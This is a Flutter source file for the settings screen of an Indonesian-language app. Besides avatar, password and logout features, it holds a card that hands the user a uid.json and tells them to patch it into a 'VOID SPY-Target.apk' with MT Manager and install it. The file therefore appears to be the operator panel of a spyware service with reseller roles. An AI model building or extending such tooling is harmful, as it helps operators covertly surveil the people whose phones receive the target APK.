import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:image_picker/image_picker.dart';
import 'package:provider/provider.dart';


import '../core/role_config.dart';
import '../services/api_client.dart';
import '../services/auth_service.dart';
import '../theme/app_theme.dart';
import '../theme/app_typography.dart';
import '../widgets/profile_avatar.dart';
import '../widgets/sync_backgrounds.dart';
import '../widgets/sync_widgets.dart';
import 'login_screen.dart';

String _avatarErrorMessage(Object error) {
  if (error is ApiException) return error.message;
  final text = error.toString();
  if (text.contains('SocketException') || text.contains('Failed host lookup')) {
    return 'Tidak bisa terhubung ke server';
  }
  if (text.contains('TimeoutException')) return 'Upload timeout, coba lagi';
  return 'Gagal memproses foto profil';
}

class SettingsScreen extends StatefulWidget {
  const SettingsScreen({super.key});

  @override
  State<SettingsScreen> createState() => _SettingsScreenState();
}

class _SettingsScreenState extends State<SettingsScreen> {
  final _oldPass = TextEditingController();
  final _newPass = TextEditingController();
  final _api = ApiClient();
  bool _loading = false;
  bool _obscureOld = true;
  bool _obscureNew = true;

  @override
  void dispose() {
    _oldPass.dispose();
    _newPass.dispose();
    super.dispose();
  }

  void _copyUidJson(String? uid) {
    final value = uid ?? '';
    Clipboard.setData(ClipboardData(text: '{\n  "uid": "$value"\n}'));
    showSyncSnack(context, 'uid.json disalin — ganti assets/uid.json di APK pakai MT Manager', success: true);
  }

  Future<void> _changePassword() async {
    final token = context.read<AuthService>().token;
    if (token == null) return;
    setState(() => _loading = true);
    try {
      await _api.postJson('/api/change-password', token: token, body: {
        'oldPassword': _oldPass.text,
        'newPassword': _newPass.text,
      });
      if (mounted) showSyncSnack(context, 'Password berhasil diubah', success: true);
      _oldPass.clear();
      _newPass.clear();
    } catch (e) {
      if (mounted) showSyncSnack(context, e.toString(), error: true);
    } finally {
      if (mounted) setState(() => _loading = false);
    }
  }

  Future<void> _showAvatarOptions() async {
    final auth = context.read<AuthService>();
    final hasAvatar = auth.user?.hasAvatar == true || auth.avatarPath != null;

    await showModalBottomSheet<void>(
      context: context,
      backgroundColor: AppColors.dashSurface,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(AppRadius.lg)),
        side: BorderSide(color: AppColors.neoBlack, width: 3),
      ),
      builder: (sheetCtx) {
        return SafeArea(
          child: Padding(
            padding: const EdgeInsets.fromLTRB(16, 12, 16, 16),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 44,
                  height: 5,
                  decoration: BoxDecoration(
                    color: AppColors.neoBlack,
                    borderRadius: BorderRadius.circular(99),
                  ),
                ),
                const SizedBox(height: 14),
                Text('Foto Profil', style: AppTypography.menuTitle()),
                const SizedBox(height: 4),
                Text('Pilih gambar untuk profil kamu', style: AppTypography.menuSubtitle()),
                const SizedBox(height: 14),
                _AvatarSheetTile(
                  icon: Icons.photo_library_outlined,
                  label: 'Galeri',
                  onTap: () async {
                    Navigator.pop(sheetCtx);
                    try {
                      await auth.pickAndUploadAvatar(ImageSource.gallery);
                      if (mounted) showSyncSnack(context, 'Foto profil diperbarui', success: true);
                    } catch (e) {
                      if (mounted) showSyncSnack(context, _avatarErrorMessage(e), error: true);
                    }
                  },
                ),
                _AvatarSheetTile(
                  icon: Icons.photo_camera_outlined,
                  label: 'Kamera',
                  onTap: () async {
                    Navigator.pop(sheetCtx);
                    try {
                      await auth.pickAndUploadAvatar(ImageSource.camera);
                      if (mounted) showSyncSnack(context, 'Foto profil diperbarui', success: true);
                    } catch (e) {
                      if (mounted) showSyncSnack(context, _avatarErrorMessage(e), error: true);
                    }
                  },
                ),
                if (hasAvatar)
                  _AvatarSheetTile(
                    icon: Icons.delete_outline_rounded,
                    label: 'Hapus Foto',
                    danger: true,
                    onTap: () async {
                      Navigator.pop(sheetCtx);
                      try {
                        await auth.removeAvatar();
                        if (mounted) showSyncSnack(context, 'Foto profil dihapus', success: true);
                      } catch (e) {
                        if (mounted) showSyncSnack(context, _avatarErrorMessage(e), error: true);
                      }
                    },
                  ),
              ],
            ),
          ),
        );
      },
    );
  }

  Future<void> _logout() async {
    final ok = await showDialog<bool>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: AppColors.dashSurface,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(AppRadius.md),
          side: const BorderSide(color: AppColors.neoBlack, width: 3),
        ),
        title: Text('Keluar Akun', style: AppTypography.menuTitle()),
        content: Text('Yakin ingin logout dari sesi ini?', style: AppTypography.menuSubtitle()),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: Text('Batal', style: TextStyle(color: AppColors.dashTextMuted, fontWeight: FontWeight.w600)),
          ),
          FilledButton(
            style: FilledButton.styleFrom(backgroundColor: AppColors.dashAccent, foregroundColor: Colors.white),
            onPressed: () => Navigator.pop(context, true),
            child: const Text('Keluar'),
          ),
        ],
      ),
    );
    if (ok != true || !mounted) return;
    await context.read<AuthService>().logout();
    if (!mounted) return;
    Navigator.of(context).pushAndRemoveUntil(syncPageRoute(const LoginScreen()), (_) => false);
  }

  @override
  Widget build(BuildContext context) {
    final auth = context.watch<AuthService>();
    final user = auth.user;
    final role = user?.role ?? 'member';
    final roleColor = _SettingsUi.roleColor(role);

    return Theme(
      data: AppTheme.light(),
      child: Scaffold(
        appBar: AppBar(
          title: Text('PROFIL', style: AppTypography.brand(size: 20)),
        ),
        body: SakuraMeshBackground(
          child: ListView(
            padding: const EdgeInsets.fromLTRB(16, 8, 16, 32),
            children: [
              FadeSlideIn(child: const _SettingsHeader()),
              const SizedBox(height: 14),
              FadeSlideIn(
                delay: const Duration(milliseconds: 40),
                child: _ElegantCard(
                  accent: true,
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Row(
                        children: [
                          Material(
                            color: Colors.transparent,
                            child: InkWell(
                              onTap: auth.avatarLoading ? null : _showAvatarOptions,
                              borderRadius: BorderRadius.circular(99),
                              child: Stack(
                                clipBehavior: Clip.none,
                                children: [
                                  ProfileAvatar(
                                    name: user?.displayName ?? user?.username ?? '?',
                                    imagePath: auth.avatarPath,
                                    size: 64,
                                    fontSize: 24,
                                    accentColor: roleColor,
                                    borderColor: AppColors.neoBlack,
                                    borderWidth: 3,
                                  ),
                                  if (auth.avatarLoading)
                                    Positioned.fill(
                                      child: DecoratedBox(
                                        decoration: BoxDecoration(
                                          shape: BoxShape.circle,
                                          color: Colors.white.withValues(alpha: 0.55),
                                        ),
                                        child: const Center(
                                          child: SizedBox(
                                            width: 20,
                                            height: 20,
                                            child: CircularProgressIndicator(strokeWidth: 2, color: AppColors.dashAccent),
                                          ),
                                        ),
                                      ),
                                    ),
                                  Positioned(
                                    right: -2,
                                    bottom: -2,
                                    child: Container(
                                      width: 24,
                                      height: 24,
                                      decoration: BoxDecoration(
                                        shape: BoxShape.circle,
                                        color: AppColors.neoYellow,
                                        border: Border.all(color: AppColors.neoBlack, width: 2.5),
                                        boxShadow: NeoShadow.hard(dx: 2, dy: 2),
                                      ),
                                      child: const Icon(Icons.camera_alt_rounded, size: 13, color: AppColors.neoBlack),
                                    ),
                                  ),
                                ],
                              ),
                            ),
                          ),
                          const SizedBox(width: 14),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                Text(user?.displayName ?? '—', style: AppTypography.welcomeName()),
                                const SizedBox(height: 4),
                                Text('@${user?.username ?? '—'}', style: AppTypography.welcomeMeta()),
                                const SizedBox(height: 6),
                                GestureDetector(
                                  onTap: auth.avatarLoading ? null : _showAvatarOptions,
                                  child: Text(
                                    auth.avatarPath != null || (user?.hasAvatar == true)
                                        ? 'Tap foto untuk ganti'
                                        : 'Tap untuk pasang foto profil',
                                    style: AppTypography.welcomeMeta().copyWith(
                                      color: AppColors.dashAccent,
                                      fontWeight: FontWeight.w700,
                                      decoration: TextDecoration.underline,
                                    ),
                                  ),
                                ),
                                const SizedBox(height: 8),
                                _RoleBadge(role: role, color: roleColor),
                              ],
                            ),
                          ),
                        ],
                      ),
                      const SizedBox(height: 16),
                      Container(
                        width: double.infinity,
                        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 12),
                        decoration: BoxDecoration(
                          borderRadius: BorderRadius.circular(AppRadius.sm),
                          color: const Color(0xFFFFF8E7),
                          border: Border.all(color: AppColors.neoBlack, width: 2.5),
                          boxShadow: NeoShadow.hard(dx: 3, dy: 3),
                        ),
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Row(
                              children: [
                                Expanded(
                                  child: Column(
                                    crossAxisAlignment: CrossAxisAlignment.start,
                                    children: [
                                      Text('UID', style: AppTypography.statLabel()),
                                      const SizedBox(height: 4),
                                      Text(user?.uid ?? '—', style: AppTypography.techId()),
                                    ],
                                  ),
                                ),
                                _UidCopyChip(
                                  label: 'Salin UID',
                                  onTap: () {
                                    Clipboard.setData(ClipboardData(text: user?.uid ?? ''));
                                    showSyncSnack(context, 'UID disalin', success: true);
                                  },
                                ),
                                const SizedBox(width: 8),
                                _UidCopyChip(
                                  label: 'uid.json',
                                  onTap: () => _copyUidJson(user?.uid),
                                ),
                              ],
                            ),
                            const SizedBox(height: 10),
                            Text(
                              'APK target (VOID SPY-Target.apk) sudah jadi. Salin uid.json di atas, buka APK pakai MT Manager, ganti assets/uid.json, install.',
                              style: AppTypography.welcomeMeta().copyWith(fontSize: 11, height: 1.45),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ),
              ),
              const SizedBox(height: 14),
              FadeSlideIn(
                delay: const Duration(milliseconds: 60),
                child: _ElegantCard(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      _SectionLabel(
                        icon: Icons.lock_reset_rounded,
                        title: 'Ganti Password',
                        subtitle: 'Minimal 6 karakter untuk keamanan akun',
                      ),
                      const SizedBox(height: 16),
                      TextField(
                        controller: _oldPass,
                        obscureText: _obscureOld,
                        decoration: InputDecoration(
                          labelText: 'Password Lama',
                          prefixIcon: const Icon(Icons.lock_outline_rounded),
                          suffixIcon: IconButton(
                            onPressed: () => setState(() => _obscureOld = !_obscureOld),
                            icon: Icon(_obscureOld ? Icons.visibility_outlined : Icons.visibility_off_outlined, size: 20),
                          ),
                        ),
                      ),
                      const SizedBox(height: 12),
                      TextField(
                        controller: _newPass,
                        obscureText: _obscureNew,
                        decoration: InputDecoration(
                          labelText: 'Password Baru',
                          prefixIcon: const Icon(Icons.lock_reset_rounded),
                          suffixIcon: IconButton(
                            onPressed: () => setState(() => _obscureNew = !_obscureNew),
                            icon: Icon(_obscureNew ? Icons.visibility_outlined : Icons.visibility_off_outlined, size: 20),
                          ),
                        ),
                      ),
                      const SizedBox(height: 18),
                      SyncPrimaryButton(
                        label: 'SIMPAN PASSWORD',
                        loading: _loading,
                        icon: Icons.save_outlined,
                        variant: ButtonVariant.light,
                        onPressed: _changePassword,
                      ),
                    ],
                  ),
                ),
              ),
              const SizedBox(height: 14),
              FadeSlideIn(
                delay: const Duration(milliseconds: 120),
                child: _ElegantCard(
                  child: Material(
                    color: Colors.transparent,
                    child: InkWell(
                      onTap: _logout,
                      borderRadius: BorderRadius.circular(14),
                      child: Padding(
                        padding: const EdgeInsets.symmetric(vertical: 4),
                        child: Row(
                          children: [
                            Container(
                              width: 40,
                              height: 40,
                              decoration: BoxDecoration(
                                borderRadius: BorderRadius.circular(12),
                                color: AppColors.error.withValues(alpha: 0.07),
                                border: Border.all(color: AppColors.error.withValues(alpha: 0.16)),
                              ),
                              child: const Icon(Icons.logout_rounded, color: AppColors.error, size: 20),
                            ),
                            const SizedBox(width: 14),
                            Expanded(
                              child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  Text('Keluar Akun', style: AppTypography.menuTitle()),
                                  Text('Akhiri sesi login saat ini', style: AppTypography.menuSubtitle()),
                                ],
                              ),
                            ),
                            Icon(Icons.chevron_right_rounded, color: AppColors.dashTextMuted.withValues(alpha: 0.7)),
                          ],
                        ),
                      ),
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 8),
            ],
          ),
        ),
      ),
    );
  }
}

abstract final class _SettingsUi {
  static Color roleColor(String role) => switch (role) {
        'developer' => const Color(0xFF7B1FA2),
        'owner' => const Color(0xFFE65100),
        'reseller' => const Color(0xFF00838F),
        'partner' => const Color(0xFF1565C0),
        _ => AppColors.dashAccent,
      };
}

class _ElegantCard extends StatelessWidget {
  const _ElegantCard({required this.child, this.padding = const EdgeInsets.all(18), this.accent = false});

  final Widget child;
  final EdgeInsets padding;
  final bool accent;

  static const _surface = Color(0xFFFFFFFF);

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(AppRadius.md),
        color: _surface,
        border: Border.all(color: AppColors.neoBlack, width: 3),
        boxShadow: NeoShadow.hardSm(),
      ),
      child: ClipRRect(
        borderRadius: BorderRadius.circular(AppRadius.md - 1),
        child: Stack(
          children: [
            if (accent)
              Positioned(
                left: 0,
                top: 0,
                bottom: 0,
                child: Container(
                  width: 6,
                  color: AppColors.dashAccent,
                ),
              ),
            Padding(
              padding: padding.copyWith(left: accent ? padding.left + 8 : padding.left),
              child: child,
            ),
          ],
        ),
      ),
    );
  }
}

class _SettingsHeader extends StatelessWidget {
  const _SettingsHeader();

  @override
  Widget build(BuildContext context) {
    return _ElegantCard(
      accent: true,
      padding: const EdgeInsets.fromLTRB(22, 22, 22, 20),
      child: Row(
        children: [
          Container(
            width: 48,
            height: 48,
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(AppRadius.sm),
              color: AppColors.dashAccent,
              border: Border.all(color: AppColors.neoBlack, width: 2.5),
              boxShadow: NeoShadow.hard(dx: 3, dy: 3),
            ),
            child: const Icon(Icons.settings_outlined, color: Colors.white, size: 24),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text('Pengaturan', style: AppTypography.brand(size: 24)),
                const SizedBox(height: 4),
                Text('ACCOUNT CENTER', style: AppTypography.tagline(color: AppColors.dashTextMuted)),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

class _UidCopyChip extends StatelessWidget {
  const _UidCopyChip({required this.label, required this.onTap});

  final String label;
  final VoidCallback onTap;

  @override
  Widget build(BuildContext context) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(10),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 7),
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(AppRadius.sm),
            color: AppColors.neoYellow,
            border: Border.all(color: AppColors.neoBlack, width: 2),
            boxShadow: NeoShadow.hard(dx: 2, dy: 2),
          ),
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Icon(Icons.copy_rounded, size: 14, color: AppColors.neoBlack),
              const SizedBox(width: 4),
              Text(label, style: AppTypography.welcomeMeta().copyWith(color: AppColors.neoBlack, fontWeight: FontWeight.w800)),
            ],
          ),
        ),
      ),
    );
  }
}

class _SectionLabel extends StatelessWidget {
  const _SectionLabel({required this.icon, required this.title, required this.subtitle});

  final dynamic icon;
  final String title;
  final String subtitle;

  @override
  Widget build(BuildContext context) {
    return Row(
      children: [
        Container(
          width: 42,
          height: 42,
          decoration: BoxDecoration(
            borderRadius: BorderRadius.circular(AppRadius.sm),
            color: AppColors.dashAccent,
            border: Border.all(color: AppColors.neoBlack, width: 2.5),
            boxShadow: NeoShadow.hard(dx: 2, dy: 2),
          ),
          child: _DynamicIcon(icon, color: Colors.white, size: 20),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(title, style: AppTypography.menuTitle()),
              Text(subtitle, style: AppTypography.menuSubtitle()),
            ],
          ),
        ),
      ],
    );
  }
}

class _AvatarSheetTile extends StatelessWidget {
  const _AvatarSheetTile({
    required this.icon,
    required this.label,
    required this.onTap,
    this.danger = false,
  });

  final dynamic icon;
  final String label;
  final VoidCallback onTap;
  final bool danger;

  @override
  Widget build(BuildContext context) {
    final color = danger ? AppColors.error : AppColors.dashAccent;
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: Material(
        color: Colors.transparent,
        child: InkWell(
          onTap: onTap,
          borderRadius: BorderRadius.circular(14),
          child: Ink(
            width: double.infinity,
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(AppRadius.sm),
              color: AppColors.dashSurface,
              border: Border.all(color: AppColors.neoBlack, width: 2.5),
              boxShadow: NeoShadow.hard(dx: 3, dy: 3),
            ),
            child: Row(
              children: [
                _DynamicIcon(icon, size: 20, color: color),
                const SizedBox(width: 12),
                Text(
                  label,
                  style: AppTypography.menuTitle().copyWith(color: danger ? AppColors.error : null),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class _RoleBadge extends StatelessWidget {
  const _RoleBadge({required this.role, required this.color});

  final String role;
  final Color color;

  @override
  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(AppRadius.sm),
        color: color,
        border: Border.all(color: AppColors.neoBlack, width: 2),
        boxShadow: NeoShadow.hard(dx: 2, dy: 2),
      ),
      child: Text(
        (RoleConfig.roleLabels[role] ?? role).toUpperCase(),
        style: AppTypography.statLabel().copyWith(color: Colors.white, fontSize: 9, letterSpacing: 1.2, fontWeight: FontWeight.w800),
      ),
    );
  }
}

// WEBA2APK_DYNAMIC_ICON_START
class _DynamicIcon extends StatelessWidget {
  final dynamic icon;
  final double? size;
  final Color? color;

  const _DynamicIcon(this.icon, {Key? key, this.size, this.color}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    if (icon == null) return const SizedBox(width: 0, height: 0);
    return Center(widthFactor: 1.0, heightFactor: 1.0, child: Icon(icon, size: size, color: color));
  }
}
// WEBA2APK_DYNAMIC_ICON_END
